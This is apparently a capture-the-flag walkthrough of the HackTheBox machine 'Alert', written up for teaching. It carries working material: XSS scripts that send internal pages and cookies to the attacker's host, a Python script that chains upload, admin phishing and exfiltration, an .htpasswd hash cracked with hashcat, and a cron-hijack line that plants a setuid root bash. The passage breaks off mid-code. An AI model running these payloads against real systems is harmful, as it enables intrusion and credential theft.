---
title: HTB: Alert
url: https://0xdf.gitlab.io/2025/03/22/htb-alert.html
date: 2025-03-22T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-alert, hackthebox, ctf, nmap, ffuf, subdomain, markdown-to-html, feroxbuster, html-injection, xss, phishing, python, python-requests, directory-traversal, file-read, hashcat, htpasswd, wireshark, source-code
---

![Alert](/img/alert-cover.png)

Alert starts with a webserver hosting a simple markdown to HTML application. I’ll upload a payload that can inject scripts into the resulting page, and send a link to the admin. I’ll use the XSS to read internal pages, and exploit a directory traversal / file read vulnerability to access the hash protecting an internal site. I’ll crack that, and use the password for SSH access. On the box, I’ll find root executing a PHP script on a cron, and find one of the imports is writable. In Beyond Root, I’ll work through three things that I tried to attack that failed, showing both my thinking at the start and using root access to show why they failed. I’ll also look at a strange filtered port.

## Box Info

| Name | [Alert](https://hackthebox.com/machines/alert)  [Alert](https://hackthebox.com/machines/alert) [Play on HackTheBox](https://hackthebox.com/machines/alert) |
| --- | --- |
| Release Date | [23 Nov 2024](https://twitter.com/hackthebox_eu/status/1859635426081808668) |
| Retire Date | 22 Mar 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Alert |
| Radar Graph | Radar chart for Alert |
| First Blood User | 00:33:19[manesec manesec](https://app.hackthebox.com/users/463126) |
| First Blood Root | 00:39:33[zer0dave zer0dave](https://app.hackthebox.com/users/721418) |
| Creator | [FisMatHack FisMatHack](https://app.hackthebox.com/users/1076236) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80), as well as a filtered port (12227):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 16:39 UTC
Nmap scan report for 10.10.11.44
Host is up (0.086s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
12227/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 16:40 UTC
Nmap scan report for 10.10.11.44
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds

```

TCP port 12227 is filtered, which means it’s likely blocked by a firewall. It doesn’t actually come up during solving, but I’ll look at it in [Beyond Root](#tcp-12227).

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

The website is redirecting to `alert.htb`.

### Subdomain Fuzz

The Apache webserver is configured such that when I request `http://10.10.11.44`, it returns a 301 Moved Permanently redirect to `http://alert.htb`. This is almost certainly an Apache rule looking at the HTTP request `Host` header, and if it is anything other than one or more defined domains, returning this redirect.

I’ll use `ffuf` to send requests with tons of possible subdomains of `alert.htb` to see if any respond differently. Most will send the same redirect, but any that don’t have a different site.

```

oxdf@hacky$ ffuf -u http://10.10.11.44 -H "Host: FUZZ.alert.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.44
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.alert.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 86ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 88ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 86ms]
:: Progress: [19966/19966] :: Job [1/1] :: 458 req/sec :: Duration: [0:00:47] :: Errors: 0 ::

```

Three respond differently. `#www` and `#main` are crashing, likely due to the `#` in the domain. `statistics` is interesting. I’ll add both the domain and the subdomain to my `/etc/hosts` file, as there’s no DNS resolver in HTB:

```
10.10.11.44 alert.htb statistics.alert.htb

```

### Website - TCP 80

#### Site

The website is a Markdown Viewer:

![image-20250319110631569](/img/image-20250319110631569.png)

If I give it these notes, it shows them as HTML:

![image-20250319110713093](/img/image-20250319110713093.png)

The page is `/visualizer.php`, but clicking “Share Markdown” opens a new tab at `/visualizer.php?link_share=67daddfbb953f2.27246107.md`.

There are three other pages on the nav bar. “Contact Us” has a form to send a message:

![image-20250319112939454](/img/image-20250319112939454.png)

On sending something, it redisplays the form with a message indicating success:

![image-20250319113010517](/img/image-20250319113010517.png)

The “About Us” page has some info:

> Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!

This implies that the messages are checked.

The “Donate” page has a form to enter an amount:

![image-20250319113204461](/img/image-20250319113204461.png)

Entering a number and clicking “Donate” just reloads the form.

#### Tech Stack

Based on the page URLs, the site seems to be running with PHP. Visiting `/` actually returns a redirect to `/index.php?page=alert`. The other pages are of the same form, such as `index.php?page=contact`.

The HTTP response headers don’t show much else of interest:

```

HTTP/1.1 200 OK
Date: Wed, 19 Mar 2025 15:12:08 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 966
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

```

The 404 page is the [default Apache 404](/cheatsheets/404#apache--httpd):

![image-20250319112141510](/img/image-20250319112141510.png)

If I mess with the `page` parameter I do get something more custom:

![image-20250319112212367](/img/image-20250319112212367.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://alert.htb -x php
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://alert.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET       23l       48w      660c http://alert.htb/index.php => index.php?page=alert
301      GET        9l       28w      308c http://alert.htb/uploads => http://alert.htb/uploads/
301      GET        9l       28w      304c http://alert.htb/css => http://alert.htb/css/
200      GET        1l        3w       24c http://alert.htb/contact.php
200      GET      182l      385w     3622c http://alert.htb/css/style.css
302      GET       23l       48w      660c http://alert.htb/ => index.php?page=alert
301      GET        9l       28w      309c http://alert.htb/messages => http://alert.htb/messages/
200      GET        1l        0w        1c http://alert.htb/messages.php
200      GET      182l      385w     3622c http://alert.htb/css/style
[####################] - 3m    120009/120009  0s      found:9       errors:12     
[####################] - 3m     30000/30000   189/s   http://alert.htb/ 
[####################] - 3m     30000/30000   192/s   http://alert.htb/uploads/ 
[####################] - 3m     30000/30000   192/s   http://alert.htb/css/ 
[####################] - 3m     30000/30000   192/s   http://alert.htb/messages/ 

```

I haven’t seen `/messages`, `messages.php`, and `/uploads`. Visiting `/messages/` and `/uploads/` both return a 403 Forbidden response.

`/messages.php` returns an empty page. Trying `/index.php?page=messages` loads an empty page as well. There is something there, but I can’t access it.

I’m surprised not to see other pages like `alert.php`, `about.php`, and `donate.php`. I’ll show why in [Beyond Root](#indexphp-page-parameter).

### statistics.alert.htb

Visiting this page simply pops an HTTP auth dialog:

![image-20250319120000181](/img/image-20250319120000181.png)

`feroxbuster` doesn’t find anything here. I’ll have to come back once I get creds.

## Shell as albert

### Dead Ends

There are a few things worth looking at here, two of which seemed like dead-ends at least for now.
- `/visualizer.php` takes a `link_share` parameter that looks like a random filename generated on my submission markdown. The names of uploads look unpredictable, but I can try to read outside of the directory. Unfortunately for me, any attempts to read files like `/etc/passwd` either with a absolute path (`link_share=/etc/passwd`) or relative path (`link_share=../../../../../../etc/passwd`) fail. Some basic encoding techniques don’t help. I’ll note that changing a character in a valid markdown file returns a different error message (“Invalid file.”) than one that attempts directory traversal (“Invalid file name.”). This leaks that some kind of filtering is going on.
- Having a single `index.php` page serving as the page template and then it having a parameter (in this case `page`) that specifies the page to `include` inside the template is a common PHP pattern. The link `/index.php?page=donate` suggests there is likely a `donate.php` file that is being included. I’m not able to get other files to load here.
- Given that the site says the admin is checking the messages, I’ll try XSS and HTML injection payloads like including `img` tags, but nothing connects back to me.

I’ll go over why each of these fail in [Beyond Root](#beyond-root).

### Arbitrary File Read

#### Injection Via Markdown

Markdown is typically able to handle HTML, so I’ll try a markdown payload that contains HTML:

```

### local XSS
<img src=x onerror=alert(1) />

### load image
<img src="http://10.10.14.6/image.png" />

### load script
<script src="http://10.10.14.6/script.js"></script>

```

I’ll start a Python webserver (`python -m http.server 80`) and upload this file. The viewer pops an alert:

![image-20250319121617477](/img/image-20250319121617477.png)

There’s also two requests at my Python webserver showing the HTML injection and XSS worked:

```
10.10.14.6 - - [19/Mar/2025 18:27:22] code 404, message File not found
10.10.14.6 - - [19/Mar/2025 18:27:22] "GET /image.png HTTP/1.1" 404 -
10.10.14.6 - - [19/Mar/2025 18:27:22] code 404, message File not found
10.10.14.6 - - [19/Mar/2025 18:27:22] "GET /script.js HTTP/1.1" 404 -

```

#### Phishing POC

I’ll see if I can get the admin to click on a link in a contact message.

![image-20250319122259981](/img/image-20250319122259981.png)

Immediately on sending this, there’s contact at my Python webserver:

```
10.10.11.44 - - [19/Mar/2025 18:34:29] code 404, message File not found
10.10.11.44 - - [19/Mar/2025 18:34:29] "GET /phish HTTP/1.1" 404 -

```

The admin is clicking.

#### XSS POC

I’ll update the markdown file (removing the `alert` as I don’t want that to make noise or get stuck with any kind of bot checking the page):

```

### load script
<script src="http://10.10.14.6/script.js"></script>

```

I’ll create a simple `script.js` file in the same directory as the Python webserver:

```

fetch('http://10.10.14.6/from_script/' + document.cookie);

```

This will just make a web request to my server. I haven’t seen any cookies on the site, but worth seeing if there’s anything I can exfil.

I’ll upload the markdown to the site, and send the link to the admin:

![image-20250319121919320](/img/image-20250319121919320.png)

There are requests at my webserver from Alert:

```
10.10.11.44 - - [19/Mar/2025 18:43:28] "GET /script.js HTTP/1.1" 200 -
10.10.11.44 - - [19/Mar/2025 18:43:29] code 404, message File not found
10.10.11.44 - - [19/Mar/2025 18:43:29] "GET /from_script/ HTTP/1.1" 404 -

```

The first is getting the script, and then the second is from the script running. There’s no cookie, which means either the user doesn’t have one, or it is marked as `http_only`.

#### messages.php

The `messages.php` file returned empty when I visited. I’m curious to see if the admin is able to see anything different. I’ll craft an injection pageload that will read `messages.php` and send me the response.

A lot of times it’s easier to leave the injection in place and just update something like `script.js` on my host. In this case, the uploaded markdown is cleaned up fairly regularly (I don’t really see why - it’s not exposing anything). So I’ll just move to putting the script directly inside the markdown.

To have the admin fetch `/messages.php` and return the page to me, I’ll use:

```

### load script
<script>
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.6/exfil?body=" + btoa(body));
})
</script>

```

I’ll upload that, and send the link to the admin, and the following request reaches my Python webserver:

```
10.10.11.44 - - [19/Mar/2025 21:12:21] "GET /exfil?body=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 404 -

```

The resulting page is very simple:

```

oxdf@hacky$ echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>

```

There’s an unordered list with a link to a single message file. The URL for that link shows that the likely file path is passed via the `file` parameter on `messages.php`.

#### Script

I’m going to want to read a bunch more pages as the admin. While making a script to read a file is not necessary to solve the box, writing a quick Python script is a fun coding exercise. My script will:
- take in the page to read;
- construct the malcious markdown file;
- upload it, and get the link;
- send the link to the admin;
- read the XSS response;
- print the result.

The result is this script that takes a URL (or later updated to take just a file path after the next section) and reads via the XSS:

```

import requests
import re
import socket
import sys

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} <target url>")
    sys.exit()
target = sys.argv[1] if sys.argv[1].startswith('http') else f'http://alert.htb/messages.php?file=../../../../{sys.argv[1]}'

# generate markdown
markdown = f"""### load script
<script>
fetch('{target}')
.then(resp => resp.text())
.then(body => {{fetch("http://10.10.14.6/exfil", {{ method: "POST", body: body}});}})
</script>
"""

# upload markdown
files = {"file": ("payload.md", markdown)}
resp = requests.post("http://alert.htb/visualizer.php", files=files)

# get share link
m = re.search(r"http://alert\.htb/visualizer\.php\?link_share=.*\.md", resp.text)
if not m:
    print("error: share link not in page")
    sys.exit()
share_link = m.group()

# send link to admin
data = {"email": "0xdf@alert.htb", "message": f"Check out this link: {share_link}"}
resp = requests.post("http://alert.htb/contact.php", data=data)

# get XSS resp
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 80))
    sock.listen(1)
    conn, addr = sock.accept()
    with conn:
        req = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            req += chunk

# print data
body = req.decode("utf-8").split("\r\n\r\n")[1]
print(body)

```

I made a slight change to exfil the data as the body of a POST request, rather than encoded in the URL. This allows me to read longer pages. Running it will read a page as admin:

```

oxdf@hacky$ time python make_request.py http://alert.htb/messages.php
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>

real    0m4.104s
user    0m0.110s
sys     0m0.037s

```

It takes ~4 seconds due to the multiple requests involved.

#### Directory Traversal

I am able to read the file in the listing (though it is empty):

```

oxdf@hacky$ python make_request.py http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt
<pre></pre>

```

I can try reading other files. I already know there’s a `messages` directory, which is likely where it is supposed to read files. I’ll try stepping up one level and reading `messages.php`:

```

oxdf@hacky$ python make_request.py http://alert.htb/messages.php?file=../messages.php
<pre><?php
$ip = $_SERVER['REMOTE_ADDR'];
if ($ip == '127.0.0.1' || $ip == '::1') {
    $directory = "messages/";

    $messages = glob($directory . "*.txt");

    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        echo "<pre>" . file_get_contents($directory . $file) . "</pre>";
    } else {
        echo "<h1>Messages</h1>";
        if (count($messages) > 0) {
            echo "<ul>";
            foreach ($messages as $message) {
                $filename = basename($message);
                echo "<li><a href='messages.php?file=$filename'>$filename</a></li>";
            }
            echo "</ul>";
        } else {
            echo "No messages found.";
        }
    }
}
?>

</pre>

```

It worked! I can see it’s using `file_get_contents`, which is why I can read the PHP source without it being executed (as it would be if it used `include`). This means I can read files across the entire file system, which is a directory traversal / file read vulnerability (and not a LFI, which requires an include to execute the included code).

This is where I updated the Python script from `target = sys.argv[1]` to:

```

target = sys.argv[1] if sys.argv[1].startswith('http') else f'http://alert.htb/messages.php?file=../../../../{sys.argv[1]}'

```

### Access to Statistics Page

#### General System Enumeration

The system root is four directories above the `messages` directory:

```

oxdf@hacky$ python make_request.py /etc/hostname
<pre></pre>

oxdf@hacky$ python make_request.py /etc/hostname
<pre>alert
</pre>

```

Unfortunately, I’m not able to read the current processes environment, but I can see the command line:

```

oxdf@hacky$ python make_request.py /proc/self/environ
<pre></pre>
oxdf@hacky$ python make_request.py /proc/self/cmdline
<pre>/usr/sbin/apache2-kstart</pre>

```

#### Apache Configs

The Apache configs for websites are typically stored in `/etc/apache2/sites-enabled`. The default name is `000-default.conf`. That file exists on Alert:

```

<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>

```

There are two sites defined here. The first is for the base domain. It include the `RewriteRule` for when the host doesn’t match `alert.htb`. It serves files from `/var/www/alert.htb`.

The second is for `statistics.alert.htb`. It services files from `/var/www/statistics.alert.htb`. It also defines the authentication with `AuthType`, `AuthName`, and `AuthUserFile`.

I’ll grab that `.htpasswd` file:

```

oxdf@hacky$ python make_request.py /var/www/statistics.alert.htb/.htpasswd
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>

```

#### Crack Hash

I’ll save that hash to a file, and pass it to `hashcat`. The auto-detect mode works, and it cracks quickly:

```

$ cat albert.hash 
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
$ hashcat albert.hash --user /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
...[snip]...
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited    
...[snip]...

```

#### Statistics Page

I’ll use these creds to access the statistics page:

![image-20250319163923948](/img/image-20250319163923948.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

It looks like a static page. The data is hardcoded into the JavaScript that generates the charts. I can read `/var/www/statistics.alert.htb/index.php`, and it doesn’t take any user interaction.

### SSH

With a password, it’s always good to check if it works for the same user on the system:

```

oxdf@hacky$ netexec ssh alert.htb -u albert -p manchesterunited
SSH         10.10.11.44     22     alert.htb        [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.10.11.44     22     alert.htb        [+] albert:manchesterunited  Linux - Shell access!

```

`netexec` says it works! And it does:

```

oxdf@hacky$ sshpass -p manchesterunited ssh albert@alert.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)
...[snip]...
albert@alert:~$ 

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never do this with real world credentials.*

I can now grab `user.txt`:

```

albert@alert:~$ cat user.txt
09d252d4************************

```

## Shell as root

### Enumeration

#### Users

albert is not able to run `sudo`:

```

albert@alert:~$ sudo -l
[sudo] password for albert: 
Sorry, user albert may not run sudo on alert.

```

There’s basically nothing else in their home directory:

```

albert@alert:~$ ls -la
total 28
drwxr-x--- 3 albert albert 4096 Nov 19 14:19 .
drwxr-xr-x 4 root   root   4096 Oct 12 02:21 ..
lrwxrwxrwx 1 albert albert    9 Mar 16  2024 .bash_history -> /dev/null
-rw-r--r-- 1 albert albert  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 albert albert 3771 Feb 25  2020 .bashrc
drwx------ 2 albert albert 4096 Mar  8  2024 .cache
-rw-r--r-- 1 albert albert  807 Feb 25  2020 .profile
-rw-r----- 1 root   albert   33 Mar  8  2024 user.txt

```

There’s one other user with a home directory on this box besides root, david:

```

albert@alert:/home$ ls
albert  david
albert@alert:/home$ ls david/
ls: cannot open directory 'david/': Permission denied
albert@alert:/home$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
albert:x:1000:1000:albert:/home/albert:/bin/bash
david:x:1001:1002:,,,:/home/david:/bin/bash

```

albert can’t access their home directory.

albert is in the management group:

```

albert@alert:/opt/website-monitor$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

```

There’s only one directory and one file with this group:

```

albert@alert:~$ find / -group management 2>/dev/null
/opt/website-monitor/config
/opt/website-monitor/config/configuration.php

```

I’ll come back to this.

#### Processes

Looking at the process list, there’s a webserver running as root that isn’t going through Apache:

```

albert@alert:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root        1003  0.0  0.6 207012 26288 ?        Ss   14:28   0:01 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
...[snip]...

```

This is interesting and unusual. It seems like someone might be testing something. It’s only listening on localhost, which is confirmed by `netstat`:

```

albert@alert:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN 

```

#### Tunnel

I’ll use `ssh` to make a tunnel so that I can access `localhost:8080` on Alert from my host. I often use the [SSH “Konami Code”](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/), but on entering “~C” here it just says “commandline disabled”:

```

albert@alert:~$ 
albert@alert:~$ 
albert@alert:~$ commandline disabled

albert@alert:~$ 

```

I’ll exit from SSH and reconnect with `-L 8888:localhost:8080`. This says to listen on port 8888 on my host, and forward anything it receives through the SSH tunnel and then out from Alert to `localhost:8080`. My choice of 8888 is arbitrary.

#### Site

Now in my browser I can load `localhost:8888` and the site comes up:

![image-20250319170543678](/img/image-20250319170543678.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s nothing too interesting about this site. I’ll find the source at `/opt/website-monitor`:

```

albert@alert:/opt/website-monitor$ ls
config     index.php  monitor.php  monitors.json  README.md  updates
incidents  LICENSE    monitors     Parsedown.php  style.css

```

The `index.php` is not very interesting. It just reads data from disk and formats it for display.

`monitor.php` is interesting. Visiting it in a browser returns an empty page. That’s because it’s a PHP script:

```

<?php
/*

Website Monitor
===============

Hello! This is the monitor script, which does the actual monitoring of websites
stored in monitors.json.

You can run this manually, but it’s probably better if you use a cron job.
Here’s an example of a crontab entry that will run it every minute:
* * * * * /usr/bin/php -f /path/to/monitor.php >/dev/null 2>&1
*/

include('config/configuration.php');

$monitors = json_decode(file_get_contents(PATH.'/monitors.json'));

foreach($monitors as $name => $url) {
        $response_data = array();
        $timestamp = time();
        $response_data[$timestamp]['timestamp'] = $timestamp;
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        if(curl_exec($curl) === false) {
                $response_data[$timestamp]['error'] = curl_error($curl);
        }
        else {
                $info = curl_getinfo($curl);
                $http_code = $info['http_code'];
                $ms = $info['total_time_us'] / 1000;
                $response_data[$timestamp]['time'] = $ms;
                $response_data[$timestamp]['response'] = $http_code;
        }

        curl_close($curl);
        if(file_exists(PATH.'/monitors/'.$name)) {
                $data = json_decode(file_get_contents(PATH.'/monitors/'.$name), TRUE);
        }
        else {
                $data = array();
        }
        $data = array_merge($data, $response_data);
        $data = array_slice($data, -60);
        file_put_contents(PATH.'/monitors/'.$name, json_encode($data, JSON_PRETTY_PRINT));
}

```

At the top of the script, the comments suggest this file should be run as a cron job, and shows an example of running it every minute. It’s reasonable to guess that’s what’s happening here (though I could upload a tool like [pspy](https://github.com/DominicBreuker/pspy) to verify).

After the comments, the first line runs `include('config/configuration.php')`. That’s the file that was in the management group! That file is writable by members of the management group like albert:

```

albert@alert:/opt/website-monitor$ ls -l config/configuration.php
-rwxrwxr-x 1 root management 49 Nov  5 14:31 config/configuration.php

```

### Exploit

I’ll open the `configuration.php` file, and it’s very short:

```

<?php
define('PATH', '/opt/website-monitor');
?>

```

I’ll add a line:

```

<?php
define('PATH', '/opt/website-monitor');
system('cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf;');
?>

```

This will execute the `system` command to create a copy of `bash` owned by root that is SetUID / SetGID. I’ll wait for the next minute, and then it’s there:

```

albert@alert:/opt/website-monitor$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1183448 Mar 19 21:22 /tmp/0xdf

```

I’ll run that with `-p` to not drop privs, and get a root shell:

```

albert@alert:/opt/website-monitor$ /tmp/0xdf -p
0xdf-5.0# id
uid=1000(albert) gid=1000(albert) euid=0(root) egid=0(root) groups=0(root),1000(albert),1001(management)

```

From here I can cleanup and read `root.txt`:

```

0xdf-5.0# rm /tmp/0xdf 
0xdf-5.0# cat root.txt
731cf7f7************************

```

## Beyond Root

I’m going to look at three things that I have exploited in the past and see why they didn’t work here.

### visualizer.php link\_share Parameter

#### Pre-root Thoughts

When sharing a link, it generates a page with a URL like `/visualizer.php?link_share=67dbf23435b1b3.01780025.md`. Right away, I suspect that it is saving my uploaded markdown with a random name, and then the if the `link_share` parameter is set when visiting `/visualizer.php`, it tries to read that file.

When I upload markdown, it just goes to `/visualizer.php`. I’m guessing it’s not saved to disk at this point, but just used to make the page. That would make the most sense as far as why it doesn’t just go to the share link to begin with. Still, it could just be weird design. Either way, once I click the “Share Markdown” link, I’m much more confident it exists on disk, probably in the `/uploads` directory identified while brute forcing.

As it is going to a folder and trying to read a file, I want to see if I can read files outside of that directory with a directory traversal, but I wasn’t able to.

One last thing to consider - based on the file extension, it seems likely that the file is being saved as markdown. I think if I were creating this site, I would go ahead and convert it to HTML on save, rather than doing so on each view. And it’s possible that the developer did that and then just used the wrong extension. If it is doing the conversion to HTML on read, that could cause some issues trying to read non-markdown files. That said, I doubt it, as plain text is just markdown, so something like `/etc/hostname` should work just fine.

When I visit `/visualizer.php?link_share=../../../../../../etc/hostname`, it returns “ Error: Invalid file name.”.

#### Source Analysis

There’s a bunch of HTML templating, and then the PHP starts. It defines a function, `showMarkdown` that takes a `$filename` parameter. Then there’s a check for what is set:

```

<body>                                                     
    <?php                                                  
    function showMarkdown($filename) {
...[snip]...                                             
    }                                                      

    if (isset($_GET['link_share'])) {
        $filename = $_GET['link_share'];  
        showMarkdown($filename);     
    } elseif (isset($_FILES['file'])) {              
...[snip]...                  
    } else {                                               
        echo "Please upload a Markdown file.";                     
    }                            
    ?>                           
</body> 

```

Either `link_share` must be set, or the `file` must be uploaded via the form. If `link_share` is set, it just calls `showMarkdown`:

```

    function showMarkdown($filename) {
        $uploadDirectory = 'uploads/';                             
        if (preg_match('/^[a-zA-Z0-9_.-]+\.md$/', $filename)) {
            $filePath = $uploadDirectory . $filename;              
            if (file_exists($filePath) && is_readable($filePath)) {
                require 'Parsedown.php';     
                $parsedown = new Parsedown();                      
                echo $parsedown->text(file_get_contents($filePath));
            } else {             
                echo "Error: Invalid file.";
            }                                              
        } else {                                           
            echo "Error: Invalid file name.";
        }                                                  
    }    

```

At the start of the function, the `$filename` is validated to have only letters, numbers, “\_”, “.”, and “-“. If any other characters are included, it returns the error. There are two different errors messages, as noted [above](#dead-ends).

As root, I’ll edit this function removing this check:

```

    function showMarkdown($filename) {
        $uploadDirectory = 'uploads/';
